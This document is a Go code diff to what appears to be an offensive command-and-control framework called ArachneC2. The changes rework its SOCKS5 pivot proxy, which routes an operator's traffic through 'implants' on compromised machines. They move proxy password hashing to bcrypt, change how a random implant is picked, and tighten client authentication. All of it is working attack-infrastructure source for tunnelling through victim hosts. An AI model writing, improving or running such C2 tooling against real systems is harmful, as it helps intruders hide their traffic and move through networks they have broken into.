@@ -3,9 +3,7 @@ package core
 import (
 	"bufio"
 	"context"
-	"crypto/sha256"
 	"encoding/binary"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -18,6 +16,7 @@ import (
 
 	"github.com/libp2p/go-libp2p/core/network"
 	"github.com/libp2p/go-libp2p/core/peer"
+	"golang.org/x/crypto/bcrypt"
 
 	"github.com/portbuster1337/ArachneC2/pkg/transport"
 )
@@ -65,13 +64,16 @@ func ClearSocksCreds() error {
 	return os.Remove(socksConfigPath())
 }
 
-func hashPassword(password string) string {
-	h := sha256.Sum256([]byte(password))
-	return hex.EncodeToString(h[:])
+func hashPassword(password string) (string, error) {
+	bytes, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+	if err != nil {
+		return "", fmt.Errorf("bcrypt hash: %w", err)
+	}
+	return string(bytes), nil
 }
 
 func checkPassword(password, hash string) bool {
-	return hashPassword(password) == hash
+	return bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) == nil
 }
 
 func (o *Operator) pickImplantPeerID(idArg string) (string, *ImplantRecord, error) {
@@ -131,20 +133,22 @@ func strconvAtoi(s string) (int, error) {
 	return n, nil
 }
 
-func isPortAvailable(port int) bool {
-	conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), 100*time.Millisecond)
-	if err != nil {
-		return true
-	}
-	conn.Close()
-	return false
-}
-
 func (o *Operator) SocksStart(implantPeerID string, port int, username, password string) error {
 	random := implantPeerID == "random"
 
 	var pid peer.ID
-	if !random {
+	if random {
+		rec, err := o.pickRandomImplant()
+		if err != nil {
+			return fmt.Errorf("no implants available for random socks: %w", err)
+		}
+		pid, err = peer.Decode(rec.PeerID)
+		if err != nil {
+			return fmt.Errorf("decode random implant peer id: %w", err)
+		}
+		implantPeerID = rec.PeerID
+		log.Printf("[socks] random selection picked implant %s@%s", rec.Name, rec.PeerID)
+	} else {
 		var err error
 		pid, err = peer.Decode(implantPeerID)
 		if err != nil {
@@ -159,19 +163,10 @@ func (o *Operator) SocksStart(implantPeerID string, port int, username, password
 	}
 	o.socksMu.Unlock()
 
-	if !isPortAvailable(port) {
-		return fmt.Errorf("port %d is already in use by another service", port)
-	}
-
 	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", port))
 	if err != nil {
 		return fmt.Errorf("listen 127.0.0.1:%d: %w", port, err)
 	}
-
-	SaveSocksCreds(&SocksCreds{
-		Username:     username,
-		PasswordHash: hashPassword(password),
-	})
 
 	ctx, cancel := context.WithCancel(o.ctx)
 
@@ -189,11 +184,7 @@ func (o *Operator) SocksStart(implantPeerID string, port int, username, password
 	o.socksProxies[port] = inst
 	o.socksMu.Unlock()
 
-	if random {
-		log.Printf("[socks] SOCKS5 proxy on 127.0.0.1:%d -> random implant per request (auth: %s)", port, username)
-	} else {
-		log.Printf("[socks] SOCKS5 proxy on 127.0.0.1:%d -> implant %s (auth: %s)", port, implantPeerID, username)
-	}
+	log.Printf("[socks] SOCKS5 proxy on 127.0.0.1:%d -> implant %s (auth: %s)", port, implantPeerID, username)
 
 	go func() {
 		<-ctx.Done()
@@ -239,20 +230,8 @@ func (o *Operator) SocksStop(port int) error {
 	return nil
 }
 
-func (o *Operator) handleSocksConn(client net.Conn, implantID peer.ID, username, password string, random bool) {
+func (o *Operator) handleSocksConn(client net.Conn, implantID peer.ID, username, password string, _ bool) {
 	defer client.Close()
-
-	if random {
-		rec, err := o.pickRandomImplant()
-		if err != nil {
-			return
-		}
-		pid, err := peer.Decode(rec.PeerID)
-		if err != nil {
-			return
-		}
-		implantID = pid
-	}
 
 	br := bufio.NewReader(client)
 	_ = client.SetDeadline(time.Now().Add(30 * time.Second))
@@ -272,15 +251,21 @@ func (o *Operator) handleSocksConn(client net.Conn, implantID peer.ID, username,
 		return
 	}
 
-	useAuth := false
+	authRequired := username != ""
+	offersAuth := false
 	for _, m := range methods {
 		if m == 2 {
-			useAuth = true
+			offersAuth = true
 			break
 		}
 	}
 
-	if useAuth {
+	if authRequired && !offersAuth {
+		client.Write([]byte{5, 0xff})
+		return
+	}
+
+	if offersAuth {
 		client.Write([]byte{5, 2})
 
 		aver, err := br.ReadByte()
